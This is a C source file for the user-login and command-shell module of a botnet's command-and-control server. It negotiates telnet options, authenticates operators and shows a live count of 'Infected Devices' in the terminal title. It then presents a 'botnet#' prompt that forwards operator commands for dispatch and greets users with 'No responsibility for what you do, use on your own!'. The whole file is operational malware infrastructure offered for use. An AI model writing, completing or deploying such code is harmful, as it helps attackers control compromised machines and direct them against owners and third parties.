#include "headers/user_handler.h"
#include "headers/botnet.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <errno.h>
#include <signal.h>
#include <termios.h>
#include <fcntl.h>
#include <sys/select.h>

int user_sockets[MAX_USERS] = {0};
pthread_mutex_t user_sockets_mutex = PTHREAD_MUTEX_INITIALIZER;

void setup_signal_handlers() {
    signal(SIGPIPE, SIG_IGN);
}

void* update_title(void* arg) {
    int client_socket = *((int*)arg);
    free(arg);

    while (1) {
        int valid_bots = 0;

        pthread_mutex_lock(&bot_mutex);
        for (int i = 0; i < bot_count; i++) {
            if (bots[i].is_valid) {
                valid_bots++;
            }
        }
        pthread_mutex_unlock(&bot_mutex);

        char buffer[64] = {0};
        int written = snprintf(buffer, sizeof(buffer), "\0337\033]0;Infected Devices: %d\007\0338", valid_bots);
        if (written > 0 && written < (int)sizeof(buffer) && client_socket > 0) {
            if (send(client_socket, buffer, (size_t)written, 0) < 0) break;
        }

        sleep(2);
    }
    
    return NULL;
}

void cleanup_user_session(int user_index) {
    pthread_mutex_lock(&user_sockets_mutex);
    if (user_index >= 0 && user_index < MAX_USERS) {
        if (user_sockets[user_index] > 0) {
            shutdown(user_sockets[user_index], SHUT_RDWR);
            close(user_sockets[user_index]);
            user_sockets[user_index] = 0;
        }
        if (user_index < user_count) {
            users[user_index].is_logged_in = 0;
        }
    }
    pthread_mutex_unlock(&user_sockets_mutex);
}

void read_until_newline(int socket, char* buffer, size_t max_len) {
    size_t pos = 0;
    char c;
    fd_set readfds;
    struct timeval tv;
    
    while (pos < max_len - 1) {
        FD_ZERO(&readfds);
        FD_SET(socket, &readfds);
        tv.tv_sec = 1;
        tv.tv_usec = 0;
        
        int ready = select(socket + 1, &readfds, NULL, NULL, &tv);
        if (ready <= 0) break;
        
        if (recv(socket, &c, 1, 0) <= 0) break;
        
        // Skip telnet control sequences
        if (c == 255) { // IAC byte
            char dummy[2];
            recv(socket, dummy, 2, 0); // Skip command and option bytes
            continue;
        }
        
        if (c == '\n' || c == '\r') {
            if (pos > 0) break;
            continue;
        }
        
        if (c >= 32 && c <= 126) {
            buffer[pos++] = c;
        }
    }
    
    buffer[pos] = '\0';
    
    // Consume any remaining newline characters
    while (1) {
        FD_ZERO(&readfds);
        FD_SET(socket, &readfds);
        tv.tv_sec = 0;
        tv.tv_usec = 100000; // 100ms timeout
        
        if (select(socket + 1, &readfds, NULL, NULL, &tv) <= 0) break;
        
        if (recv(socket, &c, 1, MSG_PEEK) <= 0) break;
        
        if (c != '\n' && c != '\r') break;
        
        recv(socket, &c, 1, 0); // Consume the newline
    }
}

void* handle_client(void* arg) {
    setup_signal_handlers();
    int client_socket = *((int*)arg);
    free(arg);

    struct sockaddr_in addr;
    socklen_t addr_len = sizeof(addr);
    if (getpeername(client_socket, (struct sockaddr*)&addr, &addr_len) != 0) {
        close(client_socket);
        return NULL;
    }

    char user_ip[INET_ADDRSTRLEN] = {0};
    if (!inet_ntop(AF_INET, &addr.sin_addr, user_ip, sizeof(user_ip))) {
        close(client_socket);
        return NULL;
    }

    // Thoroughly clean input buffer and set up telnet options
    clean_socket_buffer(client_socket);
    const char* init_seq = 
        "\377\374\042"    // WONT LINEMODE
        "\377\375\003"    // WILL SUPPRESS GO AHEAD
        "\377\373\001"    // WILL ECHO
        "\377\373\003";   // WILL SUPPRESS GO AHEAD
    send(client_socket, init_seq, strlen(init_seq), MSG_NOSIGNAL);
    usleep(100000);

    char buffer[256] = {0};
    char username[64] = {0}, password[64] = {0};

    // Handle username input
    if (send(client_socket, "\r" YELLOW "Login: " RESET, strlen("\r" YELLOW "Login: " RESET), MSG_NOSIGNAL) < 0) {
        close(client_socket);
        return NULL;
    }

    read_until_newline(client_socket, username, sizeof(username));
    if (strlen(username) == 0) {
        close(client_socket);
        return NULL;
    }

    // Handle password input with echo off
    const char* noecho = "\377\374\001"; // WONT ECHO
    send(client_socket, noecho, strlen(noecho), MSG_NOSIGNAL);
    usleep(100000);

    if (send(client_socket, "\r" YELLOW "Password: " RESET, strlen("\r" YELLOW "Password: " RESET), MSG_NOSIGNAL) < 0) {
        close(client_socket);
        return NULL;
    }

    read_until_newline(client_socket, password, sizeof(password));
    if (strlen(password) == 0) {
        close(client_socket);
        return NULL;
    }

    // Restore echo
    const char* will_echo = "\377\373\001"; // WILL ECHO
    send(client_socket, will_echo, strlen(will_echo), MSG_NOSIGNAL);
    send(client_socket, "\r\n", 2, MSG_NOSIGNAL);
    
    // Rest of the login process
    int user_index = check_login(username, password);
    if (user_index == -1) {
        snprintf(buffer, sizeof(buffer), "\r" RED "Invalid login" RESET "\r\n");
        send(client_socket, buffer, strlen(buffer), 0);
        close(client_socket);
        return NULL;
    }

    while (user_index == -2) {
        int found = 0;
        for (int i = 0; i < user_count; i++) {
            if (strcmp(username, users[i].user) == 0 && strcmp(password, users[i].pass) == 0) {
                if (user_sockets[i] != 0) {
                    char tmp;
                    ssize_t alive = recv(user_sockets[i], &tmp, 1, MSG_PEEK | MSG_DONTWAIT);
                    if (alive == 0 || (alive < 0 && errno != EAGAIN && errno != EWOULDBLOCK)) {
                        shutdown(user_sockets[i], SHUT_RDWR);
                        close(user_sockets[i]);
                        user_sockets[i] = 0;
                        users[i].is_logged_in = 0;
                    } else {
                        found = 1;
                    }
                } else {
                    users[i].is_logged_in = 0;
                }
            }
        }
        if (!found) {
            user_index = check_login(username, password);
            if (user_index != -2) break;
        }
        snprintf(buffer, sizeof(buffer), "\r" YELLOW "User connected already, Disconnect? Y/N: " RESET);
        if (send(client_socket, buffer, strlen(buffer), MSG_NOSIGNAL) < 0) {
            close(client_socket);
            return NULL;
        }
        char response[8] = {0};
        len = recv(client_socket, response, sizeof(response) - 1, 0);
        if (len <= 0) {
            close(client_socket);
            return NULL;
        }
        response[len] = 0;
        response[strcspn(response, "\r\n")] = 0;

        if (strcasecmp(response, "Y") == 0) {
            for (int i = 0; i < user_count; i++) {
                if (strcmp(username, users[i].user) == 0 && strcmp(password, users[i].pass) == 0) {
                    if (user_sockets[i] != 0) {
                        shutdown(user_sockets[i], SHUT_RDWR);
                        close(user_sockets[i]);
                        user_sockets[i] = 0;
                    }
                    users[i].is_logged_in = 0;
                }
            }
            user_index = check_login(username, password);
        } else {
            close(client_socket);
            return NULL;
        }
    }

    if (user_index >= 0) {
        User *user = &users[user_index];
        user->is_logged_in = 1;
        user_sockets[user_index] = client_socket;
        snprintf(buffer, sizeof(buffer), "\rWelcome!\n\rNo responsibility for what you do, use on your own!\r\n");
        if (send(client_socket, buffer, strlen(buffer), MSG_NOSIGNAL) < 0) {
            close(client_socket);
            user->is_logged_in = 0;
            user_sockets[user_index] = 0;
            return NULL;
        }

        pthread_t update_thread;
        int *update_arg = malloc(sizeof(int));
        if (!update_arg) {
            close(client_socket);
            user->is_logged_in = 0;
            user_sockets[user_index] = 0;
            return NULL;
        }
        *update_arg = client_socket;
        pthread_create(&update_thread, NULL, update_title, update_arg);
        pthread_detach(update_thread);

        char command[MAX_COMMAND_LENGTH];
        char prompt[128];
        while (1) {
            snprintf(prompt, sizeof(prompt), GREEN "\r%s@botnet#" RESET, user->user);
            if (send(client_socket, prompt, strlen(prompt), MSG_NOSIGNAL) < 0) break;

            memset(command, 0, sizeof(command));
            len = recv(client_socket, command, sizeof(command) - 1, 0);
            if (len <= 0) {
                close(client_socket);
                user->is_logged_in = 0;
                user_sockets[user_index] = 0;
                break;
            }
            command[len] = 0;
            
            int cmd_idx = 0;
            for (int i = 0; i < len && command[i] != '\r' && command[i] != '\n'; i++) {
                if (command[i] >= 32 && command[i] <= 126) {
                    command[cmd_idx++] = command[i];
                }
            }
            command[cmd_idx] = 0;

            if (strlen(command) == 0) {
                continue;
            }

            process_command(user, command, client_socket, user_ip);
        }
    }
    return NULL;
}